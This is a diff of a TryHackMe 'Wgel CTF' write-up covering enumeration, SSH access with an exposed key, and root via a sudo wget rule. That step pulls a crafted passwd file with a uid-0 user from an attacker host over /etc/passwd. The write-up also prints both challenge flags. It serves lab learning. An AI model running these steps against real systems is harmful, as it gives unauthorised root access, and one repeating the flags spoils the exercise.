@@ -1,169 +1,142 @@
-## 🛡️TryHackMe – Wgel CTF
-Full Technical Walkthrough & Root Compromise Report
-  
-
----
+# 🛡️ TryHackMe – Wgel CTF - Writeup
 
 ## 📌 Overview
-Room Name: Wgel CTF
+**Room Name:** Wgel CTF  
+**Platform:** TryHackMe  
+**Difficulty:** Easy  
+**Category:** Enumeration / Privilege Escalation
 
-Platform: TryHackMe
+This machine demonstrates how a seemingly harmless binary granted excessive sudo privileges can lead to full system compromise via arbitrary file write.
 
-Difficulty: Easy
+The attack chain involves:
 
-Category: Linux / Enumeration / Privilege Escalation
-
-This assessment simulates a common misconfiguration in Linux environments where a seemingly harmless binary is granted excessive sudo privileges. The attack chain involves:
-
-• Advanced service enumeration
-
-• Sensitive information disclosure in source code
-
-• Exploiting arbitrary file write via `wget`
-
-• Linux password database manipulation (`/etc/passwd`)
+- Web directory enumeration revealing an exposed `.ssh/` directory
+- SSH private key and username discovery from HTML comments
+- SSH login as `jessie`
+- sudo `wget` exploitation to overwrite `/etc/passwd`
+- Privilege escalation to root by switching to a crafted user
 
 ---
 
-## 🔍 1. Enumeration Phase
-Nmap Scan
+## 🔍 1. Enumeration
 
-Comprehensive port scanning to identify the attack surface:
+### 🔎 Port Scanning
 
-```
-
+```bash
 nmap -sV -oN nmap.log <target_ip>
-
 ```
 
-Web Directory Enumeration
+### 🌐 Web Directory Enumeration
 
-Using `gobuster` to discover hidden directories:
-
-```
-
+```bash
 gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
-
 ```
 
-Discovered Paths:
+Discovered `/sitemap` (Status: 301), which led to `/sitemap/.ssh/` — containing an exposed RSA private key.
 
-• `/sitemap` (Status: 301) -> Leading to `/sitemap/.ssh/`
+The username `jessie` was also found in the page's HTML source comments.
 
 ---
 
 ## 🔓 2. Initial Access
-Using the discovered RSA key and the username jessie (found in comments), I established an SSH connection.
 
-```
+Using the discovered RSA key and username `jessie`:
 
+```bash
 chmod 600 id_rsa
-
 ssh -i id_rsa jessie@<target_ip>
-
 ```
 
-🎯 User Flag: `057c67131c3d5e42dd5cd3075b198ff6`
+**Initial access as `jessie` achieved.** ✅
 
 ---
 
-## 🚀 3. Privilege Escalation Discovery
-After gaining initial access, I performed post-exploitation enumeration to find a path to root.
+## 👑 3. Privilege Escalation: jessie → root
 
-Running LinPEAS
+### 🔍 Sudo Misconfiguration — wget
+Ran `linpeas.sh` to enumerate privilege escalation vectors, then verified manually:
 
-I uploaded and executed `linpeas.sh` to automate the discovery of vulnerabilities.
-
-```
-
-./linpeas.sh
-
-```
-
-Critical Finding
-
-The script highlighted a critical misconfiguration in sudo permissions. I verified this by running:
-
-```
-
+```bash
 sudo -l
-
 ```
 
-Result:
-
-```
-
+```text
 (root) NOPASSWD: /usr/bin/wget
-
 ```
 
-LinPEAS identified that the `wget` command can be executed by every user as root without a password. This allows for an Arbitrary File Write attack, which can be used to overwrite system-critical files.
+`wget` with sudo allows **arbitrary file write** — including overwriting system-critical files.
 
+### 🛠️ /etc/passwd Overwrite Attack
 
-## 🛠️ 4. Exploitation (The /etc/passwd Attack)
-### Step 1: Password Hashing
+**Step 1:** Generate an MD5-crypt password hash on Kali:
 
-On the Kali machine, I generated an MD5-crypt hash for the password `1234`:
-
-```
-
+```bash
 openssl passwd -1 1234
-
 # Result: $1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0
-
 ```
 
-### Step 2: Crafting Malicious passwd File
-
-I created a local `passwd` file and appended a custom root user:
+**Step 2:** Create a malicious `passwd` file with a custom root-level user:
 
 ```
-
 hacker:$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0:0:0:root:/root:/bin/bash
-
 ```
 
-### Step 3: File Transfer & Overwrite
+**Step 3:** Host and overwrite `/etc/passwd` using `wget`:
 
-Used `wget` to overwrite the real `/etc/passwd`:
-
-```
-
+```bash
 sudo /usr/bin/wget http://<kali_ip>/passwd -O /etc/passwd
-
 ```
 
----
+**Step 4:** Switch to the new user:
 
-## 🏁 5. Root Capture
-Switched to the new user:
-
-```
-
+```bash
 su hacker
-
 # Password: 1234
 
 id
-
 # uid=0(root) gid=0(root) groups=0(root)
-
 ```
 
-🎯 Root Flag: `b1b968b37519ad1daa6408188649263d`
+**ROOT ACCESS GRANTED.** ✅
 
 ---
 
-## 🧠 Key Takeaways
-1. The Danger of 'Safe' Binaries: Binaries like `wget` can be fatal if granted `sudo` rights.
+## 🏁 Flags
 
-2. Comment Hygiene: Developers must scrub internal usernames from production code.
+### 🧍 User Flag
 
-3. SSH Key Management: Private keys should never be stored in web-accessible directories.
+```
+057c67131c3d5e42dd5cd3075b198ff6
+```
+
+### 👑 Root Flag
+
+```
+b1b968b37519ad1daa6408188649263d
+```
 
 ---
 
+## 📚 Key Takeaways
+
+- 🔑 **SSH keys must never be web-accessible:** Private keys stored in a directory served by a web server are trivially discoverable and immediately exploitable.
+- 🌐 **Comment hygiene matters:** Usernames embedded in HTML comments give attackers a direct target for credential attacks.
+- ⚠️ **"Safe" binaries can be fatal with sudo:** `wget` is not typically considered dangerous, but arbitrary file write capability combined with root privileges leads directly to full system compromise.
+
+---
+
+## 🛠️ Tools Used
+
+- `nmap`
+- `gobuster`
+- `linpeas`
+- `openssl`
+- `ssh`
+- `wget`
+
+---
+
+## 📚 Credit
 ✍️ Author: Akira Hasuo
 
 📘 Created for educational and portfolio purposes only
